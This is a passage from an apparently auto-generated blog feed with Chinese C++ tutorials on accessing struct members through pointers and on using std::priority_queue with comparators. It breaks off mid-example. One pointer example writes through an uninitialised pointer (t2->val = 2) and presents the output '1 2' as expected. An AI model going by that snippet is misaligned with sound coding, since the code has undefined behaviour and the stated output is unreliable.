MyTree*right;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int val;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    MyTree()&amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    MyTree(int val):left(NULL),right(NULL),val(val)&amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一般结构体变量的访问方式：&lt;br&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;int main()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    MyTree t;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    t.val = 1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cout&amp;lt;&amp;lt;t.val;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;可见，结构体中的变量，可以直接通过 &amp;quot;.&amp;quot; 操作符来访问。&lt;/p&gt;
&lt;p&gt;而对于结构体指针而言：必须通过 &amp;quot;-&amp;gt;&amp;quot; 符号来访问指针所指结构体的变量。&lt;br&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;int main()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    MyTree *t1 = new MyTree(1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    MyTree *t2 ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    t2-&amp;gt;val = 2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cout&amp;lt;&amp;lt;t1-&amp;gt;val&amp;lt;&amp;lt;&amp;quot; &amp;quot;&amp;lt;&amp;lt;t2-&amp;gt;val;  //输出：1 2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    t2.val = 3;  //error: request for member &amp;#x27;val&amp;#x27; in &amp;#x27;t2&amp;#x27;, whitch is of pointer type &amp;#x27;MyTree*&amp;#x27; (maybe you meant to use &amp;#x27;-&amp;gt;&amp;#x27; ?)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cout&amp;lt;&amp;lt;t2.val;  //error: request for member &amp;#x27;val&amp;#x27; in &amp;#x27;t2&amp;#x27;, which is of pointer type &amp;#x27;MyTree*&amp;#x27; (maybe you mean to use &amp;#x27;-&amp;gt;&amp;#x27; ?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
</content>
        <updated>2023-01-11T16:26:29.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/11/CPP%E4%BC%98%E5%85%88%E9%98%9F%E5%88%97priority-queue/</id>
        <title>CPP优先队列priority_queue</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/11/CPP%E4%BC%98%E5%85%88%E9%98%9F%E5%88%97priority-queue/"/>
        <content type="html">&lt;h1 id=&#34;c优先队列priority_queue用法详解&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#c优先队列priority_queue用法详解&#34;&gt;#&lt;/a&gt; c++ 优先队列 (priority_queue) 用法详解&lt;/h1&gt;
&lt;p&gt;既然是队列那么先要包含头文件 #include &amp;lt;queue&amp;gt;, 他和 queue 不同的就在于我们可以自定义其中数据的优先级，让优先级高的排在队列前面，优先出队&lt;/p&gt;
&lt;p&gt;优先队列具有队列的所有特性，包括基本操作，只是在这基础上添加了内部的一个排序，它本质是一个堆实现的&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;和队列基本操作相同:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;top 访问队头元素&lt;/li&gt;
&lt;li&gt;empty 队列是否为空&lt;/li&gt;
&lt;li&gt;size 返回队列内元素个数&lt;/li&gt;
&lt;li&gt;push 插入元素到队尾 (并排序)&lt;/li&gt;
&lt;li&gt;emplace 原地构造一个元素并插入队列&lt;/li&gt;
&lt;li&gt;pop 弹出队头元素&lt;/li&gt;
&lt;li&gt;swap 交换内容&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;定义：priority_queue&amp;lt;Type, Container,Functional&amp;gt;&lt;/p&gt;
&lt;p&gt;Type 就是数据类型，Container 就是容器类型（Container 必须是用数组实现的容器，比如 vector,deque 等等，但不能用 list。STL 里面默认用的是 vector），Functional 就是比较的方式，当需要用自定义的数据类型时才需要传入这三个参数，使用基本数据类型时，只需要传入数据类型，默认是大顶堆&lt;br&gt;
一般是：&lt;br&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;//升序队列&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;priority_queue &amp;lt;int,vector&amp;lt;int&amp;gt;,greater&amp;lt;int&amp;gt; &amp;gt; q;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//降序队列&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;priority_queue &amp;lt;int,vector&amp;lt;int&amp;gt;,less&amp;lt;int&amp;gt; &amp;gt;q;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//greater和less是std实现的两个仿函数（就是使一个类的使用看上去像一个函数。其实现就是类中实现一个operator()，这个类就有了类似函数的行为，就是一个仿函数类了）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;基本类型例子：&lt;br&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#include&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;queue&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;using namespace std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int main() &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //对于基础类型 默认是大顶堆&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    priority_queue&amp;lt;int&amp;gt; a; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //等同于 priority_queue&amp;lt;int, vector&amp;lt;int&amp;gt;, less&amp;lt;int&amp;gt; &amp;gt; a;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    priority_queue&amp;lt;int, vector&amp;lt;int&amp;gt;, greater&amp;lt;int&amp;gt; &amp;gt; c;  //这样就是小顶堆&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    priority_queue&amp;lt;string&amp;gt; b;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i = 0; i &amp;lt; 5; i++) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        a.push(i);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        c.push(i);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    while (!a.empty()) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cout &amp;lt;&amp;lt; a.top() &amp;lt;&amp;lt; &amp;#x27; &amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        a.pop();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cout &amp;lt;&amp;lt; endl;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    while (!c.empty()) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cout &amp;lt;&amp;lt; c.top() &amp;lt;&amp;lt; &amp;#x27; &amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        c.pop();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cout &amp;lt;&amp;lt; endl;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    b.push(&amp;quot;abc&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    b.push(&amp;quot;abcd&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    b.push(&amp;quot;cbd&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    while (!b.empty()) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cout &amp;lt;&amp;lt; b.top() &amp;lt;&amp;lt; &amp;#x27; &amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        b.pop();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cout &amp;lt;&amp;lt; endl;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;输出&lt;br&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;4 3 2 1 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0 1 2 3 4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cbd abcd abc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;pair 的比较，先比较第一个元素，第一个相等比较第二个&lt;br&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;queue&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;vector&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;using namespace std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int main() &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    priority_queue&amp;lt;pair&amp;lt;int, int&amp;gt; &amp;gt; a;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    pair&amp;lt;int, int&amp;gt; b(1, 2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    pair&amp;lt;int, int&amp;gt; c(1, 3);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    pair&amp;lt;int, int&amp;gt; d(2, 5);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    a.push(d);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    a.push(c);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    a.push(b);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    while (!a.empty()) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cout &amp;lt;&amp;lt; a.top().first &amp;lt;&amp;lt; &amp;#x27; &amp;#x27; &amp;lt;&amp;lt; a.top().second &amp;lt;&amp;lt; &amp;#x27;\n&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        a.pop();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;输出&lt;br&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;2 5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1 3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1 2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;对于自定义类型&lt;br&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;queue&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;using namespace std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//方法1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;struct tmp1 //运算符重载&amp;lt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int x;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    tmp1(int a) &amp;#123;x = a;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    bool operator&amp;lt;(const tmp1&amp;amp; a) const&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return x &amp;lt; a.x; //大顶堆&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//方法2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;struct tmp2 